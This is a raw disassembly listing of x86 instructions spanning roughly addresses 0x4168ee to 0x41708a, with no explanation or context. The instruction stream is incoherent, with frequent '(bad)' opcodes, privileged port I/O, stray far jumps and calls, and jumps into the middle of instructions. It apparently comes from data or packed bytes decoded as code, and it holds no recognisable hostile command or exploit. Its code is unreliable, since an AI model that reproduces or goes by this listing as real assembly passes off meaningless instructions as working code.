  4168ee:	jmp    0xd3dc5057
  4168f3:	fst    DWORD PTR [esi-0x4a3ee761]
  4168f9:	mov    dl,0x6f
  4168fb:	xchg   esi,eax
  4168fc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4168fd:	push   es
  4168fe:	faddp  st(4),st
  416900:	outs   dx,DWORD PTR ds:[esi]
  416901:	jg     0x4168eb
  416903:	and    al,0xbe
  416905:	out    dx,al
  416906:	push   ebx
  416907:	push   edx
  416908:	pop    ebp
  416909:	das    
  41690a:	retf   
  41690b:	push   0x7a
  41690d:	sub    ecx,ecx
  41690f:	in     al,0xb2
  416911:	xchg   DWORD PTR [edx-0x637f2e59],eax
  416917:	xor    DWORD PTR ds:0x19b1952b,eax
  41691d:	cmp    ebp,ebx
  41691f:	jno    0x41696b
  416921:	xlat   BYTE PTR ds:[ebx]
  416922:	pop    edi
  416923:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416924:	or     BYTE PTR [eax+0x50],ah
  416927:	pop    ss
  416928:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416929:	cwde   
  41692a:	enter  0xd88f,0x6f
  41692e:	sbb    DWORD PTR [esp+eax*4],edx
  416931:	fbstp  TBYTE PTR [esi+0x4f]
  416934:	inc    eax
  416935:	or     edi,DWORD PTR [edx+0x1c66a609]
  41693b:	push   0x2f
  41693d:	loope  0x416915
  41693f:	jnp    0x4168d2
  416941:	and    cl,BYTE PTR [eax+esi*8+0x688fac72]
  416948:	(bad)  
  416949:	scas   eax,DWORD PTR es:[edi]
  41694a:	pavgb  mm5,QWORD PTR [ecx]
  41694d:	(bad)  
  41694e:	jnp    0x41690e
  416950:	push   eax
  416951:	pop    ecx
  416952:	fidivr DWORD PTR [ecx+edi*4+0x42]
  416956:	ins    BYTE PTR es:[edi],dx
  416957:	mov    ah,BYTE PTR [ebp+0x4495e8b]
  41695d:	pop    esi
  41695e:	lock repnz sbb eax,edx
  416962:	cmc    
  416963:	jo     0x4168ea
  416965:	sub    esi,DWORD PTR [edx+0x12]
  416968:	loopne 0x416997
  41696a:	leave  
  41696b:	xor    eax,0x52012c77
  416970:	dec    edx
  416971:	int    0x53
  416973:	jge    0x41698a
  416975:	imul   ebx,DWORD PTR [esi+0x70fd1089],0x4a
  41697c:	push   edx
  41697d:	idiv   dl
  41697f:	push   ds
  416980:	xchg   ebx,ecx
  416982:	jmp    0x416c66
  416987:	cmc    
  416988:	std    
  416989:	fs mov ah,0x74
  41698c:	jno    0x416983
  41698e:	mov    ecx,0x2f2f76b9
  416993:	cmp    DWORD PTR [ebp+0x1fa519b1],0x7f
  41699a:	jo     0x416955
  41699c:	jle    0x416a0e
  41699e:	jo     0x416949
  4169a0:	lods   al,BYTE PTR ds:[esi]
  4169a1:	test   al,0x82
  4169a3:	sub    eax,0xbbf019f0
  4169a8:	cld    
  4169a9:	cmps   BYTE PTR gs:[esi],BYTE PTR es:[edi]
  4169ab:	add    cl,BYTE PTR [eax+ecx*4-0x7f0c1e70]
  4169b2:	out    0x55,al
  4169b4:	pusha  
  4169b5:	sub    ecx,DWORD PTR [esi-0x48a90f12]
  4169bb:	jmp    0x146d:0xe838d54a
  4169c2:	jno    0x4169d7
  4169c4:	sub    BYTE PTR ds:0x4b930bb9,0xff
  4169cb:	xor    DWORD PTR [edx],edi
  4169cd:	fisubr DWORD PTR [ecx]
  4169cf:	cs xchg ebp,eax
  4169d1:	push   0xffffff91
  4169d3:	push   esi
  4169d4:	cs das 
  4169d6:	imul   eax,ebp,0xe6ca864
  4169dc:	sbb    BYTE PTR [edi-0x3fe7c9c0],ch
  4169e2:	aaa    
  4169e3:	repz sbb BYTE PTR [ecx],ch
  4169e6:	mov    eax,ds:0x1dd4eb18
  4169eb:	call   0xf1707cb8
  4169f0:	fmul   DWORD PTR [ecx-0x24]
  4169f3:	pushf  
  4169f4:	sahf   
  4169f5:	(bad)  
  4169f6:	mov    edx,0x26006d40
  4169fb:	dec    esp
  4169fc:	sbb    eax,0xbe468fdd
  416a01:	cli    
  416a02:	loopne 0x416a4a
  416a04:	call   0x1758:0x6e1a3b75
  416a0b:	jno    0x4169c8
  416a0d:	gs adc eax,esi
  416a10:	mov    edx,edi
  416a12:	jnp    0x416a2f
  416a14:	aaa    
  416a15:	sub    ah,BYTE PTR [edx+0x56fb9e13]
  416a1b:	push   DWORD PTR [eax+0x48]
  416a1e:	test   eax,0xc2afb4f6
  416a23:	pop    eax
  416a24:	mov    esp,0x7ac44372
  416a29:	jno    0x416a3f
  416a2b:	mov    DWORD PTR [eax],esp
  416a2d:	pop    es
  416a2e:	out    dx,eax
  416a2f:	cmc    
  416a30:	xlat   BYTE PTR ds:[ebx]
  416a31:	ins    DWORD PTR es:[edi],dx
  416a32:	mov    ah,0x61
  416a34:	inc    esp
  416a35:	and    DWORD PTR [ecx],edi
  416a37:	cmc    
  416a38:	inc    ebp
  416a39:	leave  
  416a3a:	adc    ah,BYTE PTR [edi]
  416a3c:	push   esi
  416a3d:	enter  0x3165,0x71
  416a41:	inc    ecx
  416a42:	adc    BYTE PTR [esi+edx*8+0x6b],dl
  416a46:	adc    eax,0xb6c0c74f
  416a4b:	mov    dh,BYTE PTR [edx+0x1998299d]
  416a51:	add    eax,0x87ad15d4
  416a56:	pop    edi
  416a57:	sub    al,0x6d
  416a59:	mov    dh,0x14
  416a5b:	vandps xmm1,xmm2,XMMWORD PTR [eax+0x7aea2f58]
  416a63:	cwde   
  416a64:	sub    dl,BYTE PTR [ebx+0x71]
  416a67:	mov    cl,0xf2
  416a69:	or     DWORD PTR [eax+0x56dd86b3],edx
  416a6f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416a70:	fs inc edi
  416a72:	(bad)  
  416a73:	mov    eax,0xcda1ff0e
  416a78:	int    0x11
  416a7a:	daa    
  416a7b:	imul   DWORD PTR [ebx]
  416a7d:	adc    DWORD PTR [edx],ecx
  416a7f:	jmp    0xefc95a49
  416a84:	pop    eax
  416a85:	pop    edx
  416a86:	push   edx
  416a87:	jmp    0xe99ea68b
  416a8c:	int    0x9
  416a8e:	mov    cl,0xc8
  416a90:	mov    dl,0x98
  416a92:	xor    esi,edi
  416a94:	fwait
  416a95:	mov    WORD PTR ds:0xd83ef2ab,cs
  416a9b:	pop    edi
  416a9c:	sti    
  416a9d:	pop    ebp
  416a9e:	dec    DWORD PTR [edx]
  416aa0:	ret    
  416aa1:	jne    0x416b07
  416aa3:	pop    ds
  416aa4:	in     al,0x7b
  416aa6:	mov    cl,0x49
  416aa8:	mov    dl,0x6e
  416aaa:	mov    ebp,0xc53a72c0
  416aaf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416ab0:	push   edx
  416ab1:	stos   BYTE PTR es:[edi],al
  416ab2:	push   ebp
  416ab3:	fidivr WORD PTR [edx+0x27]
  416ab6:	aad    0x16
  416ab8:	imul   ebp,DWORD PTR [edi-0x71cb87cd],0x65
  416abf:	and    al,0x17
  416ac1:	or     ah,dl
  416ac3:	inc    edi
  416ac4:	(bad)  [eax+edi*4+0x6645dc83]
  416acb:	adc    BYTE PTR [ebx+ebp*1-0x612b0ca],dl
  416ad2:	nop
  416ad3:	adc    al,0x39
  416ad5:	sahf   
  416ad6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416ad7:	jae    0x416b0b
  416ad9:	cld    
  416ada:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416adb:	adc    ch,BYTE PTR [ebx+0x2e]
  416ade:	mov    dh,bh
  416ae0:	stos   BYTE PTR es:[edi],al
  416ae1:	lahf   
  416ae2:	sbb    al,0xe
  416ae4:	push   esi
  416ae5:	xchg   esi,eax
  416ae6:	mov    dl,0x3f
  416ae8:	shl    BYTE PTR ds:[edx-0x3f],0x74
  416aed:	jnp    0x416aac
  416aef:	adc    BYTE PTR [edx-0x163c9ecd],ah
  416af5:	mov    ecx,DWORD PTR [edi]
  416af7:	xor    BYTE PTR [edi-0x4c],bh
  416afa:	fnstcw WORD PTR [eax+0x2896401]
  416b00:	mov    ecx,0x972b5a56
  416b05:	mov    ecx,0x7b9a32e9
  416b0a:	aaa    
  416b0b:	loop   0x416b09
  416b0d:	add    al,0x81
  416b0f:	hlt    
  416b10:	aam    0xf2
  416b12:	sbb    DWORD PTR [edx+0x1fefde39],esi
  416b18:	fisub  WORD PTR [ebx]
  416b1a:	in     al,dx
  416b1b:	push   ebp
  416b1c:	xor    eax,0x46bf2ccd
  416b21:	aam    0xbd
  416b23:	pop    ss
  416b24:	test   edi,edx
  416b26:	je     0x416b01
  416b28:	fild   WORD PTR [esi+eax*1]
  416b2b:	mov    al,ds:0xf56df575
  416b30:	pusha  
  416b31:	mov    ds:0xca23d56a,al
  416b36:	stos   BYTE PTR es:[edi],al
  416b37:	jo     0x416b10
  416b39:	dec    eax
  416b3a:	rol    DWORD PTR [edi+0x16],0x6c
  416b3e:	dec    edx
  416b3f:	mov    ch,0xeb
  416b41:	cmp    cl,dl
  416b43:	(bad)  
  416b44:	mov    eax,DWORD PTR [edi+0x11]
  416b47:	add    al,0x3f
  416b49:	dec    esi
  416b4a:	mov    edi,0x84d64c5d
  416b4f:	pop    edi
  416b50:	jmp    0x416af2
  416b52:	cmp    al,0xa1
  416b54:	int3   
  416b55:	in     eax,0x4f
  416b57:	out    0xa8,al
  416b59:	scas   al,BYTE PTR es:[edi]
  416b5a:	(bad)
  416b5d:	push   esp
  416b5e:	jno    0x416b85
  416b60:	stc    
  416b61:	sub    DWORD PTR [edx+0x6],ecx
  416b64:	les    edx,FWORD PTR [eax+0x6e7d704d]
  416b6a:	mov    gs,WORD PTR [esi+0x1e750f00]
  416b70:	mov    ch,0x2f
  416b72:	cmovae esp,DWORD PTR [ebp+0x725b9d5b]
  416b79:	std    
  416b7a:	test   DWORD PTR [esi],eax
  416b7c:	repz sbb DWORD PTR [ebp+edx*2+0x2a5c86e4],ebx
  416b84:	adc    bl,BYTE PTR [ecx+edi*4]
  416b87:	rcr    BYTE PTR [edx],cl
  416b89:	les    ecx,FWORD PTR [ecx+0x36]
  416b8c:	sub    ah,BYTE PTR [edx-0x558c1ed5]
  416b92:	jnp    0x416c0d
  416b94:	ret    0x7b9d
  416b97:	mov    ds:0xd066ade,al
  416b9c:	outs   dx,BYTE PTR ds:[esi]
  416b9d:	sahf   
  416b9e:	(bad)  
  416b9f:	(bad)  
  416ba0:	xor    bh,BYTE PTR [edx+0x4d]
  416ba3:	scas   al,BYTE PTR es:[edi]
  416ba4:	mov    eax,ds:0x3ceb58e2
  416ba9:	mov    ecx,0xa8834e24
  416bae:	or     eax,0xc825c9ee
  416bb3:	inc    ebp
  416bb4:	stos   DWORD PTR es:[edi],eax
  416bb5:	mov    ebx,tr1
  416bb8:	ds sti 
  416bba:	mov    esi,0xf06d142b
  416bbf:	dec    edx
  416bc0:	inc    edi
  416bc1:	add    BYTE PTR [ebp+0x423e0c77],0xe9
  416bc8:	(bad)  
  416bc9:	ins    DWORD PTR es:[edi],dx
  416bca:	(bad)  
  416bcb:	ret    0x6ba
  416bce:	test   BYTE PTR [esi],dh
  416bd0:	jno    0x416bff
  416bd2:	mov    eax,0xcf7cb2d2
  416bd7:	inc    ebp
  416bd8:	pop    esi
  416bd9:	or     al,0x24
  416bdb:	pusha  
  416bdc:	fisub  DWORD PTR [esp+edi*8]
  416bdf:	in     al,0xf5
  416be1:	mov    esi,0x30d0d026
  416be6:	mov    ah,0xce
  416be8:	mov    ds:0x92b8ff18,al
  416bed:	ret    
  416bee:	add    eax,0x3206a577
  416bf3:	and    ah,BYTE PTR [esi]
  416bf5:	js     0x416bcf
  416bf7:	add    DWORD PTR gs:[esi],eax
  416bfa:	lea    ecx,[eax]
  416bfc:	lds    edx,FWORD PTR [ebx-0x1]
  416bff:	mov    gs,WORD PTR [ebx+0x16]
  416c02:	push   es
  416c03:	not    edx
  416c05:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416c06:	push   0x4f
  416c08:	(bad)  
  416c0a:	push   esi
  416c0b:	dec    ebx
  416c0c:	sub    bx,cx
  416c0f:	hlt    
  416c10:	mov    ch,0x4c
  416c12:	jnp    0x416bf5
  416c14:	pop    ds
  416c15:	pop    esp
  416c16:	or     DWORD PTR fs:[ebx-0x243ee272],ebp
  416c1d:	or     al,al
  416c1f:	cmp    DWORD PTR [ecx],eax
  416c21:	jp     0x416c9e
  416c23:	jge    0x416bc9
  416c25:	es sub al,0x6d
  416c28:	push   cs
  416c29:	jmp    0x9c16:0xe6136099
  416c30:	inc    edx
  416c31:	sbb    eax,0x4e4a99f4
  416c36:	adc    DWORD PTR [ebp+0x39f907df],ecx
  416c3c:	push   esp
  416c3d:	add    DWORD PTR [edx+0x30a9505d],eax
  416c43:	mov    edi,0x5ba9531b
  416c48:	xor    ecx,DWORD PTR [edi+0x6a0ad3ca]
  416c4e:	jne    0x416cba
  416c50:	(bad)  
  416c51:	aam    0xb4
  416c53:	mov    ebx,0x21c91047
  416c58:	je     0x416cd3
  416c5a:	cdq    
  416c5b:	dec    eax
  416c5c:	or     ch,BYTE PTR [edi+eax*4]
  416c5f:	mov    esi,0x1ae93ca6
  416c64:	add    eax,0x458b49f2
  416c69:	in     al,0xe9
  416c6b:	fild   WORD PTR [edx]
  416c6d:	add    BYTE PTR [eax],al
  416c6f:	outs   dx,BYTE PTR ds:[esi]
  416c70:	ds push eax
  416c72:	loopne 0x416cd4
  416c74:	outs   dx,BYTE PTR ds:[esi]
  416c75:	outs   dx,BYTE PTR ds:[esi]
  416c76:	mov    esi,0xcbfa089
  416c7b:	jbe    0x416cf3
  416c7d:	hlt    
  416c7e:	and    eax,0x707f1cee
  416c83:	mov    ecx,0x2570707e
  416c88:	sbb    dh,bl
  416c8a:	(bad)  
  416c8c:	or     eax,0xa4854f69
  416c91:	mov    ebx,0x614c5ec8
  416c96:	popa   
  416c97:	fdivr  st(7),st
  416c99:	loope  0x416cc1
  416c9b:	das    
  416c9c:	in     eax,dx
  416c9d:	iret   
  416c9e:	cli    
  416c9f:	(bad)  [edx]
  416ca1:	outs   dx,BYTE PTR ds:[esi]
  416ca2:	leave  
  416ca3:	stos   DWORD PTR es:[edi],eax
  416ca4:	push   esi
  416ca5:	mov    cl,0x6e
  416ca7:	sbb    DWORD PTR [esi+0x34d7a872],0x35
  416cae:	xor    ebx,edx
  416cb0:	add    BYTE PTR [edi-0x19],bh
  416cb3:	fst    DWORD PTR [edi-0x20]
  416cb6:	ret    
  416cb7:	xchg   ebx,eax
  416cb8:	mov    ds:0xad4c5d98,al
  416cbd:	addr16 cdq 
  416cbf:	ror    BYTE PTR [edx],1
  416cc1:	adc    ch,BYTE PTR [edi-0x7d]
  416cc4:	ror    bh,cl
  416cc6:	xchg   esp,eax
  416cc7:	fcomp  DWORD PTR [ebx+edx*8+0x5ea8a121]
  416cce:	nop
  416ccf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416cd0:	ds mov ebx,0x935a87c6
  416cd6:	call   0xbddb:0xcc3f0ae2
  416cdd:	sub    dl,BYTE PTR [edx+edi*2]
  416ce0:	cs mov ebx,esp
  416ce3:	sub    eax,0xf70ea28
  416ce8:	cs test eax,0x2876cc18
  416cee:	dec    esp
  416cef:	cmp    al,0xf
  416cf1:	push   DWORD PTR [esp+ecx*4]
  416cf4:	or     eax,0xcbc408d1
  416cf9:	test   DWORD PTR [ebx+ecx*8-0x65f0a5e6],esp
  416d00:	mov    esp,0x7b9303bc
  416d05:	jno    0x416d0d
  416d07:	pop    edx
  416d08:	retf   0xc4ff
  416d0b:	gs push esi
  416d0d:	xchg   edi,eax
  416d0e:	push   eax
  416d0f:	cmp    DWORD PTR [ebp-0x6f],edx
  416d12:	scas   al,BYTE PTR es:[edi]
  416d13:	popf   
  416d14:	sbb    BYTE PTR [ebx],dh
  416d16:	sbb    BYTE PTR [eax],bl
  416d18:	push   esi
  416d19:	mov    bh,0xae
  416d1b:	in     eax,0x23
  416d1d:	retf   
  416d1e:	dec    esp
  416d1f:	push   ecx
  416d20:	mov    dl,BYTE PTR [ebx-0x5d87dce2]
  416d26:	xchg   esi,eax
  416d27:	fwait
  416d28:	rol    esi,cl
  416d2a:	out    dx,eax
  416d2b:	push   ebp
  416d2c:	out    0x3d,eax
  416d2e:	jmp    0x5dfb:0xe3437a12
  416d35:	jp     0x416ce8
  416d37:	sbb    ah,bl
  416d39:	mov    ecx,0xb10d60f
  416d3e:	outs   dx,BYTE PTR ds:[esi]
  416d3f:	push   esp
  416d40:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416d41:	enter  0x7a76,0x66
  416d45:	adc    bh,BYTE PTR [esi]
  416d47:	ja     0x416d2b
  416d49:	dec    edi
  416d4a:	sbb    dl,BYTE PTR [edx]
  416d4c:	adc    DWORD PTR ds:0xab6df65e,ecx
  416d52:	leave  
  416d53:	neg    BYTE PTR [ecx-0x54]
  416d56:	cs mov ebp,0xe6bf39d6
  416d5c:	js     0x416d1c
  416d5e:	xlat   BYTE PTR ds:[ebx]
  416d5f:	push   edi
  416d60:	sahf   
  416d61:	cmp    edx,DWORD PTR [ebx]
  416d63:	or     eax,0x38da58b0
  416d68:	fidivr WORD PTR [esi-0x21c3d07d]
  416d6e:	or     al,dl
  416d70:	mov    ebp,0xff7c95d8
  416d75:	push   cs
  416d76:	cwde   
  416d77:	pop    ecx
  416d78:	loop   0x416dec
  416d7a:	sti    
  416d7b:	inc    BYTE PTR [edx]
  416d7d:	popa   
  416d7e:	jl     0x416d6d
  416d80:	sub    bh,bh
  416d82:	out    0x8b,eax
  416d84:	jg     0x416dae
  416d86:	ins    BYTE PTR es:[edi],dx
  416d87:	cmp    dh,ah
  416d89:	outs   dx,DWORD PTR ds:[esi]
  416d8a:	rol    BYTE PTR [eax+0x6e],1
  416d8d:	xchg   DWORD PTR [edx],eax
  416d8f:	mov    ds:0x80eef405,eax
  416d94:	dec    esp
  416d95:	push   edx
  416d96:	in     eax,0xf1
  416d98:	jbe    0x416df5
  416d9a:	arpl   WORD PTR [ebx+ecx*2],bp
  416d9d:	jp     0x416d72
  416d9f:	xchg   esi,eax
  416da0:	aaa    
  416da1:	mov    bh,0xba
  416da3:	xchg   esp,eax
  416da4:	sbb    eax,0xbb6b28a1
  416da9:	int    0xab
  416dab:	jmp    0x5552:0xf586be62
  416db2:	inc    ebp
  416db3:	or     al,BYTE PTR ds:0xb750c107
  416db9:	sbb    BYTE PTR [edx-0x6e],al
  416dbc:	cli    
  416dbd:	int    0x55
  416dbf:	jecxz  0x416dae
  416dc1:	arpl   WORD PTR [ebx-0x4c],ax
  416dc4:	popf   
  416dc5:	mov    bl,0xa3
  416dc7:	jno    0x416dce
  416dc9:	push   ebx
  416dca:	jecxz  0x416de1
  416dcc:	cdq    
  416dcd:	dec    edi
  416dce:	xchg   esp,eax
  416dcf:	xchg   edx,eax
  416dd0:	ds mov ebp,0x5ece9edb
  416dd6:	(bad)  
  416dd7:	enter  0x57cc,0x28
  416ddb:	outs   dx,BYTE PTR ds:[esi]
  416ddc:	xchg   esi,eax
  416ddd:	aas    
  416dde:	int3   
  416ddf:	neg    DWORD PTR [ebx-0x4f6aeaee]
  416de5:	outs   dx,BYTE PTR ds:[esi]
  416de6:	add    dl,BYTE PTR [ecx+0x1fa7e9b4]
  416dec:	loopne 0x416dc3
  416dee:	ds or  al,0xab
  416df1:	(bad)  
  416df2:	mov    ebp,0xb82dbbc
  416df7:	dec    edx
  416df8:	loope  0x416e66
  416dfa:	push   ds
  416dfb:	into   
  416dfc:	in     al,dx
  416dfd:	mov    al,BYTE PTR [ebx]
  416dff:	fwait
  416e00:	and    BYTE PTR [edx],ah
  416e02:	je     0x416dd0
  416e04:	repnz add eax,0xc9026e30
  416e0a:	add    al,0xf8
  416e0c:	and    eax,0xfb15ebae
  416e11:	and    eax,0x5f1f8714
  416e16:	mov    esi,0x82a81bc4
  416e1b:	jmp    0x7a8fcfba
  416e20:	shr    edi,1
  416e22:	enter  0x5aca,0xe8
  416e26:	mov    esi,0xf8be1e34
  416e2b:	cmp    eax,0xf7827dbf
  416e30:	and    al,0xf7
  416e32:	test   DWORD PTR [ebx+0x20],ebx
  416e35:	inc    ebp
  416e36:	aas    
  416e37:	xlat   BYTE PTR ds:[ebx]
  416e38:	outs   dx,DWORD PTR ds:[esi]
  416e39:	stos   DWORD PTR es:[edi],eax
  416e3a:	push   ebx
  416e3b:	mov    dh,0x18
  416e3d:	test   BYTE PTR [ebp-0x1ff00c50],bh
  416e43:	push   esi
  416e44:	retf   
  416e45:	push   ecx
  416e46:	cmp    ecx,DWORD PTR [edx-0x49d4d4ae]
  416e4c:	mov    WORD PTR [edx-0x14],?
  416e4f:	ror    bh,cl
  416e51:	fsubr  DWORD PTR [ebx+0x7b]
  416e54:	add    al,0xf8
  416e56:	mov    dh,0x9a
  416e58:	sub    al,0x90
  416e5a:	loopne 0x416e63
  416e5c:	push   ebx
  416e5d:	or     ebp,DWORD PTR [edi+edi*1]
  416e60:	mov    ds:0x39704456,al
  416e65:	pop    ecx
  416e66:	adc    al,0x1c
  416e68:	xchg   esi,eax
  416e69:	push   ss
  416e6a:	dec    cl
  416e6c:	mov    ebx,es
  416e6e:	push   0x3e426a45
  416e73:	std    
  416e74:	(bad)  
  416e76:	jl     0x416e92
  416e78:	fwait
  416e79:	add    eax,0xf37bd73f
  416e7e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416e7f:	push   0x106ec440
  416e84:	mov    ch,0x8a
  416e86:	push   cs
  416e87:	popa   
  416e88:	(bad)  [eax]
  416e8a:	outs   dx,DWORD PTR ds:[esi]
  416e8b:	mov    ds:0x1e0a38e,al
  416e90:	jns    0x416f03
  416e92:	addr16 mov edx,0x40c689a2
  416e98:	xchg   BYTE PTR [ebx-0x34225ab9],dh
  416e9e:	and    BYTE PTR [edx-0x2d],bl
  416ea1:	nop
  416ea2:	sbb    ebp,0xd672c838
  416ea8:	sahf   
  416ea9:	cli    
  416eaa:	jge    0x416e74
  416eac:	sub    ah,BYTE PTR [edx]
  416eae:	and    al,0x7a
  416eb0:	outs   dx,BYTE PTR ds:[esi]
  416eb1:	in     eax,0x7d
  416eb3:	push   es
  416eb4:	sub    al,0x55
  416eb6:	scas   eax,DWORD PTR es:[edi]
  416eb7:	cs (bad) 
  416eb9:	scas   al,BYTE PTR es:[edi]
  416eba:	push   ss
  416ebb:	(bad)  
  416ebc:	mov    edi,0x3a0ce378
  416ec1:	aam    0xf1
  416ec3:	scas   eax,DWORD PTR es:[edi]
  416ec4:	cmp    dh,BYTE PTR [eax+eiz*2-0x28db97d9]
  416ecb:	lea    ebx,[esi+0x63]
  416ece:	push   es
  416ecf:	setne  dh
  416ed2:	and    eax,0xf50273e6
  416ed7:	jno    0x416ec5
  416ed9:	jmp    0xe0dafd45
  416ede:	push   ebp
  416edf:	test   ecx,0x8881f5af
  416ee5:	outs   dx,DWORD PTR ds:[esi]
  416ee6:	inc    esp
  416ee7:	xor    eax,0x3855529f
  416eec:	and    al,0x6f
  416eee:	mov    dl,0xb8
  416ef0:	out    0x41,eax
  416ef2:	fmul   DWORD PTR [ecx-0x77855ec0]
  416ef8:	cmp    ecx,DWORD PTR [edi+0x30]
  416efb:	in     eax,dx
  416efc:	out    dx,eax
  416efd:	and    dl,BYTE PTR [esi+0x718f98d0]
  416f03:	int3   
  416f04:	outs   dx,DWORD PTR ds:[esi]
  416f05:	xchg   edi,eax
  416f06:	jp     0x416ec2
  416f08:	(bad)  
  416f09:	mov    DWORD PTR [ebx+0x4afa067d],edx
  416f0f:	sub    BYTE PTR ds:0xda5fa274,ch
  416f15:	jae    0x416eb8
  416f17:	hlt    
  416f18:	outs   dx,DWORD PTR ds:[esi]
  416f19:	pusha  
  416f1a:	xchg   cl,bh
  416f1c:	pushf  
  416f1d:	lds    edx,FWORD PTR [ebx-0x4b2731a9]
  416f23:	ins    DWORD PTR es:[edi],dx
  416f24:	iret   
  416f25:	mov    edi,DWORD PTR [ecx-0x40]
  416f28:	mov    edi,0xbda4fc1d
  416f2d:	xor    DWORD PTR [ecx-0x65f8901],esi
  416f33:	pop    edx
  416f34:	push   esp
  416f35:	popf   
  416f36:	xchg   DWORD PTR [edx],ecx
  416f38:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416f39:	arpl   WORD PTR [ecx-0x16],dx
  416f3c:	pop    edi
  416f3d:	out    0x6,eax
  416f3f:	loopne 0x416f2d
  416f41:	or     BYTE PTR [ecx-0x2222b1fe],dh
  416f47:	mov    BYTE PTR [edi],dl
  416f49:	dec    esi
  416f4a:	hlt    
  416f4b:	fsubr  QWORD PTR [ebx-0x5]
  416f4e:	imul   eax,ecx
  416f51:	add    esp,eax
  416f53:	xchg   edx,eax
  416f54:	push   eax
  416f55:	xor    ebx,ebx
  416f57:	mov    edx,esp
  416f59:	jmp    0x41723d
  416f5e:	cmp    al,0x58
  416f60:	push   esp
  416f61:	add    dh,BYTE PTR [edx+esi*1+0x4a]
  416f65:	data16 (bad) 
  416f68:	and    ch,cl
  416f6a:	inc    ebx
  416f6b:	les    esp,FWORD PTR [eax]
  416f6d:	ja     0x416fa6
  416f6f:	sbb    DWORD PTR [edi+0x70],edi
  416f72:	mov    ecx,0x8270707e
  416f77:	dec    edx
  416f78:	or     ebx,DWORD PTR [edx]
  416f7a:	pop    ds
  416f7b:	ds cdq 
  416f7d:	out    0x7b,al
  416f7f:	cmp    ecx,ecx
  416f81:	jecxz  0x416f98
  416f83:	cmp    al,0xb0
  416f85:	in     al,dx
  416f86:	ss inc esi
  416f88:	jno    0x416fa2
  416f8a:	mov    al,ds:0x55ba302b
  416f8f:	scas   al,BYTE PTR es:[edi]
  416f90:	jnp    0x416fa0
  416f92:	nop
  416f93:	pop    esi
  416f94:	pop    ebp
  416f95:	adc    BYTE PTR [ecx+0x54510e6b],bl
  416f9b:	scas   al,BYTE PTR es:[edi]
  416f9c:	fadd   QWORD PTR [esi-0x32]
  416f9f:	adc    dh,dl
  416fa1:	sbb    edx,DWORD PTR [edi]
  416fa3:	mov    cs,WORD PTR [esi+0x64]
  416fa6:	cmp    al,0xcf
  416fa8:	inc    edi
  416fa9:	push   ebp
  416faa:	es mov dh,0x5
  416fad:	je     0x416fab
  416faf:	or     al,0x1f
  416fb1:	pop    es
  416fb2:	into   
  416fb3:	in     eax,dx
  416fb4:	nop    DWORD PTR [esi-0xff627d3]
  416fbb:	dec    esp
  416fbc:	sub    al,0x54
  416fbe:	mov    eax,ds:0x8a4250d2
  416fc3:	(bad)  
  416fc4:	outs   dx,DWORD PTR ds:[esi]
  416fc5:	add    al,0x66
  416fc7:	xchg   DWORD PTR [ecx],eax
  416fc9:	sub    edi,esi
  416fcb:	imul   edi,DWORD PTR [esi-0x6c5fcb68],0xeda6a6f2
  416fd5:	ror    BYTE PTR [esi+ebx*2-0x35d77041],cl
  416fdc:	leave  
  416fdd:	cwde   
  416fde:	sti    
  416fdf:	shl    ah,0x6b
  416fe2:	jg     0x416fe0
  416fe4:	cld    
  416fe5:	xchg   esi,eax
  416fe6:	sub    esi,ebp
  416fe8:	and    al,0x2e
  416fea:	cmp    esp,ebx
  416fec:	push   esp
  416fed:	lods   al,BYTE PTR ds:[esi]
  416fee:	pop    eax
  416fef:	jmp    0x41700b
  416ff1:	and    esp,edi
  416ff3:	es ret 0x3c4
  416ff7:	jne    0x41701a
  416ff9:	fsubr  QWORD PTR [ecx-0x1d]
  416ffc:	pop    ds
  416ffd:	add    BYTE PTR [esi-0x12226b08],bh
  417003:	inc    eax
  417004:	push   edx
  417005:	les    esi,FWORD PTR [edi+ecx*8+0x13]
  417009:	int    0x6c
  41700b:	mov    gs,edx
  41700d:	push   ecx
  41700e:	sub    eax,0x12f5532e
  417013:	rol    DWORD PTR [esp+esi*2-0x1c867b61],1
  41701a:	jmp    FWORD PTR [ebx-0x424e1a95]
  417020:	mov    ebx,0x1d1a57f7
  417025:	loope  0x417089
  417027:	mov    cl,0xc4
  417029:	stos   BYTE PTR es:[edi],al
  41702a:	rcr    BYTE PTR [edx],cl
  41702c:	mov    ds:0xa5d99e69,eax
  417031:	add    al,0x43
  417033:	sbb    DWORD PTR [eax],ebp
  417035:	repz cmp eax,0xea92db76
  41703b:	dec    ebp
  41703c:	repz dec edx
  41703e:	rcl    DWORD PTR [edx-0x5f],1
  417041:	stos   BYTE PTR es:[edi],al
  417042:	int    0x7
  417044:	test   BYTE PTR [ebp+ebx*1+0x3699cd8c],ah
  41704b:	js     0x417089
  41704d:	mov    eax,ds:0xa823390b
  417052:	ret    0x89de
  417055:	outs   dx,BYTE PTR ds:[esi]
  417056:	ja     0x4170cf
  417058:	(bad)  
  417059:	int3   
  41705a:	pop    ebp
  41705b:	xor    al,0x22
  41705d:	jb     0x417069
  41705f:	inc    eax
  417060:	cmp    bl,BYTE PTR [eax-0x2a]
  417063:	out    dx,eax
  417064:	ds xchg ebp,eax
  417066:	mov    dl,BYTE PTR [edx-0x51]
  417069:	shr    esi,0xc0
  41706c:	inc    edx
  41706d:	sub    cl,BYTE PTR [ebp-0x471b7c61]
  417073:	daa    
  417074:	xor    BYTE PTR [edx-0x204d3cb5],ch
  41707a:	xchg   edi,eax
  41707b:	out    dx,eax
  41707c:	mov    ds,WORD PTR [ebx-0x23]
  41707f:	sub    ebx,DWORD PTR [edi+eiz*1]
  417082:	jno    0x41705e
  417084:	push   ebx
  417085:	cmp    ebx,ebp
  417087:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417088:	add    al,BYTE PTR [eax]
  41708a:	jo     0x4170b4
